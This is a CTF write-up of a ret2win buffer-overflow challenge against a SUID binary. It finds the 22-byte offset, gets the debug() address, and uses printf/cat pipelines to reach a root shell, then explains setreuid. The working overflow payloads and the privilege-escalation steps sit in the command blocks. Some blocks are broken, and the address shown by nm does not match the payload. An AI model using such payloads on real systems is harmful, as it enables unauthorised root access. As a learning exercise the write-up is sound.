# Checking binary type & protections

My idea was to first download it and work on it locally. As we access the target through SSH we need to use `scp` to download the files  

```bash
➜  baby_pwn git:(main) ✗ scp -P 10020 baby@tcp0.infra.ctf.grehack.fr:/home/baby/baby .
➜  baby_pwn git:(main) ✗ scp -P 10020 baby@tcp0.infra.ctf.grehack.fr:/home/baby/baby.c .
➜  baby_pwn git:(main) ✗ ls -l
total 32
-rwxrwxr-x 1 kali kali 19264 Nov 16 16:56 baby
-rw-r--r-- 1 kali kali  4717 Nov 16 16:56 baby.c
```  

I couldn't interact with the binary locally: had a `file not found` error, so i switched to interact with it directly from the target machine (i could launch `checksec` and `file` on it locally tho).  

```bash

*props for the ASCII art^^*

So we know it's a ret2win type challenge: there's a function `debug(()`, which isn't called by main() or anywhere else ... and we need to find a way to call it to get a shell as root.

`baby` has a SUID which means that whoever runs the binary, will run it as root. So if we get a shell, obtained by a function which is inside the binary, we'll get a root shell (more details about this at the bottom of the article).  

# The plan
The goal is to overwrite the buffer, overflowing into memory enough so we can reach the saved EBP (the one pushed on the stack right before `slogan()` is called , and write there the the address of `debug()`.  
Like this, when `debug()` is fully executed, the program, which was supposed to return to `main()` and then terminate,  will instead call `debug()`, and open a root shell.

# Finding the offset
First we need to find how many characters we need to inject in order to reach EIP. After few trials i found out the number is 22. You can't see it here but i was running the payload (containing As and four Bs) from inside GDB and when i had all four Bs inside EIP at the time of crash, i knew i had found the offset (this number can sometimes vary when sending the payload from 'outside' of the binary).   

We need to send 22 A + 4 B in order to fully fill EIP. The goal is to have `debug()` address at one point on top of the stack (so at ESP), so when EIP points to it, it'll execute `debug()`.

# Getting the `debug()` function address  

```bash
0773290cf797:~$ ls -l baby
-rwxsrwxr-x 1 baby baby 19264 Nov 16 16:56 baby
```

We can do it from 'outside' or 'inside' the binary. Let's do it from the outside:  

```bash
0773290cf797:~$ nm baby | grep debug
08048205 T debug
```  

> OK we have the number of chars we need to write, our address, so lets get into it.<br> 

# Getting a shell
I tried combinations of perl, python and bash commands to inject my payload into `baby` but non worked

```bash
0773290cf797:~$ python --version
Python 3.12.3
0773290cf797:~$ python -c 'print(b"A" * 22' + b"\x05\x92\x04\x08")' | ./baby
0773290cf797:~$ perl -e 'print "A" x 22 . "\x05\x92\x04\x08"' | ./baby
0773290cf797:~$ echo -e 'AAAAAAAAAAAAAAAAAAAAAA\x05\x92\x04\x08' | ./baby
```  
*you don't see it here but they all caused the program to crash without even printing anything from `debug()`*   


> A friend later advised me to add `0x0a` to the `echo -e` command in order to add a new line char and maybe avoid the crash (0x0a = new line char in hexa)*  


`printf()` printed me something from `debug()` so i chose to stick to it  

```bash
0773290cf797:~$ printf 'AAAAAAAAAAAAAAAAAAAAAA\x05\x92\x04\x08\n' | ./baby
Fill this : New is not always ...?
...

AAAAAAAAAAAAAAAAAAAAAA ? The good one is the following one :
New is not always better ! But sometimes, it is ;)
Debug mode enabled
^C
0773290cf797:~$
```
*the the program was crashing, but at least i got something more!*  

Now the idea is that the `stdin` (standard input) remains **open** so we can throw in a `cat flag.txt` and read the flag.
In Unix-like systems, `stdin` is the input **stream** that a process reads from. So as long as our `baby` binary reads this 'stream', anything that goes in it (like `cat flag.txt`) will be read by `baby` and displayed in our terminal.  
We do this by **enclosing** the payload with a `cat` command and pipe this into the binary. 
TL;DR: the program will be blocked from terminating before we can even throw in some commands.

## How dows this works ?  
Using `()` with commands inside will create a subshell in which those commands will be executed, let's try it:  

```bash
0773290cf797:~$ (printf 'AAAAAAAAAAAAAAAAAAAAAA\x05\x92\x04\x08'; cat)

AAAAAAAAAAAAAAAAAAAAAA�

^C
0773290cf797:~$
```  

As you can see, i had to manually cut the execution using CTRL+C otherwise the content is just being `cat`ted (not an official term, please don't kill me...) indefinitely ...
So it's kinda like a tunnel is being created, and one way to exit it is by using CTRL+C.  

Good so now we have this tunnel, lets pipe it into the binary. This will allow us to be able to `cat` indefinitely, thats useless here but at least long enough to cat our `flag.txt` and get our flag. 


```bash
0773290cf797:~$ (printf 'AAAAAAAAAAAAAAAAAAAAAA\x05\x92\x04\x08\n'; cat) | ./baby

# Further reflections  
I know i woudl get a root shell but i've never really understand why so i digged into that.  

## The `debug` function
Why are we getting a root shell ? Well, `debug()` being the one giving us that, let's analyse it.  

```c
void debug(){
    setreuid(geteuid(), geteuid());
    printf("Debug mode enabled\n");
    system("/bin/ash");
}
```  

## setruid
From the man pages we see that `setreuid` takes two parameters: `ruid` and `euid`.  

```bash
0773290cf797:~$ man setreuid
...
int setreuid(uid_t ruid, uid_t euid);
...
setreuid() sets real and effective user IDs of the calling process.
``` 

`real user ID` (ruid) = the user who owns the process aka the user who started the process.
`effective user ID` (euid) = the ID the process uses for permission checks.  

`setreuid(getieuid(), geteuid())` will therefore sets both IDs to whatever `getuid()` returns both times.  
`geteuid` will return the effective user ID of the calling process. 

The binary being run as `root`, when we call a shell from one of its function, so 'inside' it, `geteuid()` will both times return `0` which is the `root` user ID. `setreuid()` will therefore also returns `0` and poof, we get a root shell.
